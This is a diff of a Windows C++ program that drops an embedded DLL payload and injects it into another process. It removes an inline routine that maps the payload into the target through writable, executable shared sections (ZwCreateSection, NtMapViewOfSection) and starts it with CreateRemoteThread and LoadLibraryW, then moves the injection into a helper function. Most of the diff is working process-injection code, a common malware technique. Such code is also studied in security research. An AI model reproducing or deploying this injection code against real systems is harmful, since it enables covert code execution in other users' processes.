@@ -1,14 +1,17 @@
-#pragma comment(lib, "Shlwapi.lib")
+#include <windows.h>
 #include <Shlwapi.h>
 
-#include <windows.h>
 #include <stdio.h>
+
 #include "resource.h"
-#include "ntddk.h"
 
 #include "createproc.h"
 #include "enumproc.h"
 #include "target_util.h"
+
+#include "inject_with_loadlibrary.h"
+
+#pragma comment(lib, "Shlwapi.lib")
 
 BYTE* get_raw_payload(OUT SIZE_T &res_size)
 {
@@ -45,54 +48,6 @@ BOOL write_to_file(BYTE* res_data, DWORD res_size, WCHAR* payloadName)
         }
     }
     return TRUE;
-}
-
-PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
-{
-    HANDLE hSection = NULL;
-    OBJECT_ATTRIBUTES hAttributes;
-    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
-
-    LARGE_INTEGER maxSize;
-    maxSize.HighPart = 0;
-    maxSize.LowPart = shellcodeSize;
-    NTSTATUS status = NULL;
-    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
-        return NULL;
-    }
-    printf("Section handle: %x\n", hSection);
-
-    PVOID sectionBaseAddress = NULL;
-    SIZE_T viewSize = 0;
-    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
-
-    // map the section in context of current process:
-    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
-        return NULL;
-    }
-    printf("Section BaseAddress: %p\n", sectionBaseAddress);
-
-    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
-    printf("Shellcode copied!\n");
-
-    //map the new section into context of opened process
-    PVOID sectionBaseAddress2 = NULL;
-    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
-        return NULL;
-    }
-
-    //unmap from the context of current process
-    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
-    ZwClose(hSection);
-
-    printf("Section mapped at address: %p\n", sectionBaseAddress2);
-    return sectionBaseAddress2;
 }
 
 bool drop_dll_to_dir(WCHAR* inject_path)
@@ -153,23 +108,11 @@ int main(int argc, char *argv[])
 
     if (!drop_dll_to_dir(inject_path)) return -1;
 
-    //we need to write the full path of the DLL into the remote process:
-    PVOID remote_ptr = map_code_into_process(hProcess, (BYTE*)inject_path, sizeof(inject_path));
-    printf("Path writen to: %p\n", remote_ptr);
-
-    HMODULE hModule = GetModuleHandle(L"kernel32.dll");
-    if (!hModule) return -1;
-
-    FARPROC hLoadLib = GetProcAddress(hModule, "LoadLibraryW");
-    if (!hLoadLib) return -1;
-
-    // Inject to the other process:
-    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLib, remote_ptr, NULL, NULL);
-    if(hRemoteThread == NULL) {
-        //injection failed, delete the dropped dll:
+   if (!inject_with_loadlibrary(hProcess, inject_path)) {
+       //injection failed, delete the dropped dll:
         DeleteFile(inject_path);
+        printf("Failed!\n");
     }
-
     system("pause");
     return 0;
 }
